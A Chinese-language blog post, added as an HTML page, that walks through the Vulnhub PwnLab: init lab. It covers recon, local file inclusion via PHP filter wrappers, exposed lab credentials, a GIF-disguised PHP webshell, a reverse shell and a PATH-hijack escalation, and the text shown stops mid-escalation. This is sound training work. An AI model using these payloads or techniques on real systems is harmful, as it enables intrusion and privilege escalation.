@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-18pwnlab_init | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-18pwnlab_init</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 23, 2024&nbsp;&nbsp;14:56:12</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Vulnhub-18pwnlab-init"><a href="#Vulnhub-18pwnlab-init" class="headerlink" title="Vulnhub-18pwnlab_init"></a>Vulnhub-18pwnlab_init</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.111.141</span>     nmap --min-rate <span class="number">100000</span> -p80,<span class="number">111</span>,<span class="number">3306</span>,<span class="number">42637</span> -A <span class="number">192.168.111.141</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.141</span>   dirb  http://<span class="number">192.168.111.141</span>/      nikto -host <span class="number">192.168.111.141</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-18pwnlab-init//image-20241123150003733.png" alt="image-20241123150003733"></p>
+<ul>
+<li><pre><code>在网络通信中，端口号的范围从 **0 到 65535**，其中：
+
+- **0 到 1023** 是 **知名端口**，用于标准服务（如 HTTP 使用 80 端口，HTTPS 使用 443 端口等）。
+- **1024 到 49151** 是 **注册端口**，通常由应用程序或协议注册使用。
+- **49152 到 65535** 是 **动态或私有端口**，这些端口一般由操作系统动态分配，用于客户端与服务器之间的临时通信。
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">### 在<span class="number">80</span>端口下有</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.141/images/">http://192.168.111.141/images/</a><br><a target="_blank" rel="noopener" href="http://192.168.111.141/upload/">http://192.168.111.141/upload/</a><br><a target="_blank" rel="noopener" href="http://192.168.111.141/config.php/">http://192.168.111.141/config.php/</a> &#x2F;&#x2F;这个是空的，但是肯定存在这个文件<br><a target="_blank" rel="noopener" href="http://192.168.111.141/login.php/">http://192.168.111.141/login.php/</a><br><a target="_blank" rel="noopener" href="http://192.168.111.141/upload.php/">http://192.168.111.141/upload.php/</a><br><a target="_blank" rel="noopener" href="http://192.168.111.141/?page=login">http://192.168.111.141/?page=login</a><br><a target="_blank" rel="noopener" href="http://192.168.111.141/?page=upload">http://192.168.111.141/?page=upload</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.141/">http://192.168.111.141</a> [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache&#x2F;2.4.10 (Debian)], IP[192.168.111.141], Title[PwnLab Intranet Image Hosting]<br>Apache&#x2F;2.4.10 (Debian)： multiple&#x2F;webapps&#x2F;51193.py   windows&#x2F;dos&#x2F;9.c</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 在<span class="number">111</span>端口下有</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>linux&#x2F;dos&#x2F;26887.rb  linux&#x2F;dos&#x2F;41974.rb   unix&#x2F;dos&#x2F;20376.txt  但是不一定能利用</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 在<span class="number">3306</span>端口暂未发现什么</span><br><span class="line"></span><br><span class="line">### <span class="number">42637</span>端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个端口应该是和111端口一起用的</p>
+<p>111端口通常用于 Portmap 服务，也叫做 rpcbind，它是一个网络服务，通常运行在 UNIX&#x2F;Linux 系统中。Portmap 服务的作用是将远程过程调用（RPC）协议的请求映射到对应的本地服务上，使得远程机器可以通过网络访问本机提供的各种服务。</p>
+<p>具体来说，111端口用于：</p>
+<p>RPC绑定：它帮助系统管理 RPC 服务的端口映射。RPC 协议被广泛应用于文件系统（如 NFS）、打印服务、邮件服务等分布式应用程序中。Portmap 会维护一个映射表，记录各个 RPC 服务所占用的端口号，客户端可以通过这个映射表来找到相应服务的端口。</p>
+<p>NFS (Network File System)：NFS 是一个文件共享协议，它依赖 RPC 协议来实现远程文件系统的访问。Portmap 通过 111 端口提供服务，使得客户端能够访问 NFS 服务。</p>
+<p>需要注意的是，111端口通常不需要对外开放，因此为了安全起见，很多服务器会采取措施关闭此端口，避免潜在的安全风险。</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## getshell</span><br><span class="line"></span><br><span class="line">### <span class="number">1.</span>伪协议获取源码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.141/?page=login">http://192.168.111.141/?page=login</a> 这里存在文件包含漏洞<br>我在这里尝试了 <a target="_blank" rel="noopener" href="http://192.168.111.141/?page=../../../etc/passwd">http://192.168.111.141/?page=../../../etc/passwd</a>   <a target="_blank" rel="noopener" href="http://192.168.111.141/?page=../../../../../etc/passwd">http://192.168.111.141/?page=../../../../../etc/passwd</a><br>也尝试了一下php伪协议  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=login">http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=login</a> 读到login.php的代码<br>&lt;?php<br>session_start();<br>require(“config.php”);  &#x2F;&#x2F;这里我看到配置文件了<br>$mysqli &#x3D; new mysqli($server, $username, $password, $database);</p>
+<p>if (isset($_POST[‘user’]) and isset($_POST[‘pass’]))<br>{<br>    $luser &#x3D; $_POST[‘user’];<br>    $lpass &#x3D; base64_encode($_POST[‘pass’]);</p>
+<p>​	$stmt &#x3D; $mysqli-&gt;prepare(“SELECT * FROM users WHERE user&#x3D;? AND pass&#x3D;?”);<br>​	$stmt-&gt;bind_param(‘ss’, $luser, $lpass);</p>
+<p>​	$stmt-&gt;execute();<br>​	$stmt-&gt;store_Result();</p>
+<p>​	if ($stmt-&gt;num_rows &#x3D;&#x3D; 1)<br>​	{<br>​		$_SESSION[‘user’] &#x3D; $luser;<br>​		header(‘Location: ?page&#x3D;upload’);<br>​	}<br>​	else<br>​	{<br>​		echo “Login failed.”;<br>​	}<br>}<br>else<br>{<br>​	?&gt;</p>
+<pre><code>&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+&lt;label&gt;Username: &lt;/label&gt;&lt;input id=&quot;user&quot; type=&quot;test&quot; name=&quot;user&quot;&gt;&lt;br /&gt;
+&lt;label&gt;Password: &lt;/label&gt;&lt;input id=&quot;pass&quot; type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p>​	&lt;?php<br>}</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=upload">http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=upload</a> 读到upload.php的代码<br><?php
+session_start();
+if (!isset($_SESSION['user'])) { die('You must be log in.'); }
+?></p>
+<html>
+    <body>
+        <form action method="post" enctype="multipart/form-data">
+            <input type="file" name="file" id="file">
+            <input type="submit" name="submit" value="Upload">
+        </form>
+    </body>
+</html>
+<?php 
+if(isset($_POST['submit'])) {
+    if ($_FILES['file']['error'] <= 0) {
+        $filename  = $_FILES['file']['name'];
+        $filetype  = $_FILES['file']['type'];
+        $uploaddir = 'upload/';
+        $file_ext  = strrchr($filename, '.');
+        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
+        $whitelist = array(".jpg",".jpeg",".gif",".png"); 
+
+<pre><code>    if (!(in_array($file_ext, $whitelist))) &#123;
+        die(&#39;Not allowed extension, please upload images only.&#39;);
+    &#125;
+
+    if(strpos($filetype,&#39;image&#39;) === false) &#123;
+        die(&#39;Error 001&#39;);
+    &#125;
+
+    if($imageinfo[&#39;mime&#39;] != &#39;image/gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] != &#39;image/png&#39;) &#123;
+        die(&#39;Error 002&#39;);
+    &#125;
+
+    if(substr_count($filetype, &#39;/&#39;)&gt;1)&#123;
+        die(&#39;Error 003&#39;);
+    &#125;
+
+    $uploadfile = $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;
+
+    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) &#123;
+        echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;;
+    &#125; else &#123;
+        die(&#39;Error 4&#39;);
+    &#125;
+&#125;
+</code>
+<p>}</p>
+<p>?&gt;</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=index">http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=index</a> 读到index.php<br><?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+    include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?></p>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+</head>
+<body>
+<center>
+<img src="images/pwnlab.png"><br>
+[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr><br>
+<?php
+    if (isset($_GET['page']))
+    {
+        include($_GET['page'].".php");
+    }
+    else
+    {
+        echo "Use this server to upload and share image files inside the intranet";
+    }
+?>
+</center>
+</body>
+</html>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=config 读到config.php
+<?php
+$server	  = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?>
+有账号密码，原来mysql是在这里用的
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+常用的php伪协议： 
+http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=index.php
+http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+http://www.xx.com?file=file:///etc/passsword
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?cmd=php://input">http://127.0.0.1/cmd.php?cmd=php://input</a><br>POST数据：<?php phpinfo()?></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### <span class="number">2.</span>登录mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show databses;		use Users;		show tables;		select *from users;</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image<span class="string">-20241123154737000</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123154737000</span>.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>+——+——————+<br>| user | pass             |<br>+——+——————+<br>| kent | Sld6WHVCSkpOeQ&#x3D;&#x3D; |	JWzXuBJJNy<br>| mike | U0lmZHNURW42SQ&#x3D;&#x3D; |	SIfdsTEn6I<br>| kane | aVN2NVltMkdSbw&#x3D;&#x3D; |	iSv5Ym2GRo<br>+——+——————+</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### <span class="number">3.</span>对上面已经获取的代码进行白盒分析</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对上传文件进行了白名单限制，只允许上传后缀为jpg、jpeg、gif以及png文件<br>并且对文件头进行校验</p>
+<p>isset($_COOKIE[‘lang’])：这是一个条件语句，检查名为lang的Cookie是否存在。isset()函数<br>用于检测变量是否已设置并且非null。<br>如果$_COOKIE[‘lang’]存在，代码将继续执行下一行。<br>include(“lang&#x2F;“.$_COOKIE[‘lang’]); 这行代码使用include语句来包含一个语言文件。它使用$_COOKIE[‘lang’]的值构建文件路径，并将该文件包含到当前的代码文件中。</p>
+<p>准备好一句话木马并将文件头写为GIF89a</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image<span class="string">-20241123155048047</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123155048047</span>.png)</span><br><span class="line"></span><br><span class="line">![image<span class="string">-20241123163025077</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123163025077</span>.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;保存文件为webshell.jpg 上传，这里是正常上传<br>GIF89a<br><?php
+system($_GET['cmd']);
+phpinfo();
+?><br>查看upload目录下看看图片的路径 <a target="_blank" rel="noopener" href="http://192.168.111.141/upload/85bb6e49a1be4be02eefb660f9d8cf68.jpg">http://192.168.111.141/upload/85bb6e49a1be4be02eefb660f9d8cf68.jpg</a><br>如果我们设置cookie为lang&#x3D;..&#x2F;upload&#x2F;85bb6e49a1be4be02eefb660f9d8cf68.jpg &#x2F;&#x2F;webshell.jpg的相对路径<br>那么index.php的包含lang的代码可以写成 include(“lang&#x2F;“…&#x2F;upload&#x2F;85bb6e49a1be4be02eefb660f9d8cf68.jpg);</p>
+<p>现在继续上传一次同时用burpsuite抓包，在cookie后面跟上lang&#x3D;..&#x2F;upload&#x2F;85bb6e49a1be4be02eefb660f9d8cf68.jpg<br>那么就能在upload执行include(“lang&#x2F;“…&#x2F;upload&#x2F;85bb6e49a1be4be02eefb660f9d8cf68.jpg);就是说在upload能连shell</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 传webshell</span><br><span class="line"></span><br><span class="line">![image<span class="string">-20241123164656692</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123164656692</span>.png)</span><br><span class="line"></span><br><span class="line">![image<span class="string">-20241123164727268</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123164727268</span>.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是我发现只有上传好的那一刻才能执行include，那么直接改成反弹shell吧,我把webshell.jpg改成了kali上的php-reverse-shell的内容，再开一下监听<br>webshell.jpg的目录没有变，lang的值就没有变，重新上传就拿到反弹shell了</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image<span class="string">-20241123165907884</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123165907884</span>.png)</span><br><span class="line"></span><br><span class="line">![image<span class="string">-20241123170010497</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123170010497</span>.png)</span><br><span class="line"></span><br><span class="line">## 提权</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先获取交互式shell	python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’<br>只有kent-JWzXuBJJNy	kane-iSv5Ym2GRo	可以登录	find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src<span class="operator">=</span><span class="string">&quot;Vulnhub-18pwnlab-init/image-20241123170911814.png&quot;</span> alt<span class="operator">=</span><span class="string">&quot;image-20241123170911814&quot;</span> style<span class="operator">=</span><span class="string">&quot;zoom:67%;&quot;</span> /&gt;&lt;img src<span class="operator">=</span><span class="string">&quot;Vulnhub-18pwnlab-init/image-20241123170959697.png&quot;</span> alt<span class="operator">=</span><span class="string">&quot;image-20241123170959697&quot;</span> style<span class="operator">=</span><span class="string">&quot;zoom: 50%;&quot;</span> /&gt;&lt;img src<span class="operator">=</span><span class="string">&quot;Vulnhub-18pwnlab-init/image-20241123171008789.png&quot;</span> alt<span class="operator">=</span><span class="string">&quot;image-20241123171008789&quot;</span> style<span class="operator">=</span><span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>都不行，继续进行信息收集。<br>在kane用户的home目录下发现了msgmike  通过strings msgmike发现通过system权限执行的cat命令  但是&#x2F;home&#x2F;mike&#x2F;msg.txt文件不存在<br>system<br>_<em>libc_start_main<br><strong>gmon_start</strong><br>GLIBC_2.0<br>PTRh<br>QVh[<br>[^</em>]<br>cat &#x2F;home&#x2F;mike&#x2F;msg.txt</p>
+<p>1.尝试使用命令劫持在当前目录下写一个cat文件并给他运行权限	echo &#x2F;bin&#x2F;bash &gt;cat		chmod +x cat<br>2.利用环境变量劫持，将环境变量修改为cat文件目录下也就是当前目录下export PATH&#x3D;.:$PATH	然后再次尝试运行msgmike<br>这时候我们的用户变为了mike  因为该文件的所有用户以及所有组为mike，当我们运行该文件时，执行我们创建的cat文件里的bin&#x2F;bash文件为mike权限，故我们的用户切换为了mike  当我们用cd切换到当前用户目录时，发现我们还是处在kane目录下，因为我们现在本质上还是kane用户，我们只不过是劫持了msgmike文件中的cat命令，又因为msgmike文件归属于mike，所以我们现在拥有了mike所拥有的权限<br>3.在mike的home目录下翻找发现msg2root&#x2F;&#x2F;也就是说msg to root &#x2F;&#x2F;这个作者肯定是中国人hhhhhhhh<br>那就继续前面的操作</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image<span class="string">-20241123172417209</span>](Vulnhub<span class="string">-18</span>pwnlab-init/image<span class="string">-20241123172417209</span>.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
